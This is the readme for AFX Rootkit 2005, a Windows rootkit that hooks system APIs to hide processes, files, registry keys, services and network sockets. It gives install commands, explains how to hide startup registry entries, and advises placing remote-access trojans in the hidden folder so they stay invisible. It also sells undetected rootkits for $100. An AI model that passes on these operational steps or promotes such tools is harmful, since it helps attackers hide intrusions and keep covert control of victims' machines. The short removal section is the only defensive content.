AFX Rootkit 2005 by Aphex
http://www.iamaphex.net
aphex@iamaphex.net

WARNING -> FOR WINDOWS NT/2000/XP/2003 ONLY!

This program patches Windows API to hide certain objects from being listed.

Current Version Hides:
a) Processes
b) Handles
c) Modules
d) Files & Folders
e) Registry Keys & Values
f) Services
g) TCP/UDP Sockets
h) Systray Icons

Configuring a computer with the rootkit is simple...

1. Create a new folder with a uniqiue name i.e. "c:\winnt\rewt\"
2. In this folder place the root.exe i.e. "c:\winnt\rewt\root.exe"
3. Execute root.exe with the "/i" parameter i.e. "start c:\winnt\rewt\root.exe /i"
4. Inside this folder place any other programs or files.

Everything inside the root folder is now invisible! If you place other services or programs
in the root folder they will be invisible from process/file/dll/handle/socket/etc listing.
However, all programs in the root folder can see each other.

Registry value names are hidden differently from everything else. The name must begin with the
root folder name followed by "\" and other characters i.e. "rewt\hiddenstartup1".

Registry key names are hidden if they have the same name as the root folder i.e. "rewt".

Also, the root folder is unique throughout the system. This means "c:\rewt\", "c:\winnt\rewt\"
and "c:\winnt\system32\rewt\" all will be hidden because they all share the root folder name "rewt".
So make sure you pick a good name!

NOTE: Most RATs have an install method that involves copying the EXE to a system folder, this is bad
      because if the process is executed from outside the root folder it will be visible! If possible
      disable this startup method.

Removal: Don't ask me for help on this! If you install it on yourself make sure you know how to remove it!

  Method 1
   1. Run the root.exe with the "/u" parameter
   2. Delete all the files associated with it
   3. Reboot

  Method 2
   1. Boot into safe mode
   2. Locate the service with the root folder name
   3. Remove the service and delete all the files associated with it
   4. Reboot

ATTENTION!!

Undetected rootkits are on sale for $100 each. Payment by paypal, egold, western union, check or money order!

Contact aphex@iamaphex.net for purchase.

ATTENTION!!

GREETS/LINKS

holy_father - http://rootkit.host.sk
Greg - http://www.rootkit.com
EES - http://www.evileyesoftware.com
MegaSecurity - http://www.megasecurity.org
Alchemist - http://www.cruel-intentionz.net
censorednet - http://www.censorednet.org
Digerati - http://digerati.sinred.com
tataye - http://www.beastdoor.com
nuclear winter crew - http://www.nuclearwinter.mirrorz.com/
akcom - http://www.akcom.org
illwill - http://illmob.org
naked crew - http://www.nakedcrew.net
supercachi - http://www.mosucker.net
J3N7IL - http://j3n7il.net/forum/index.php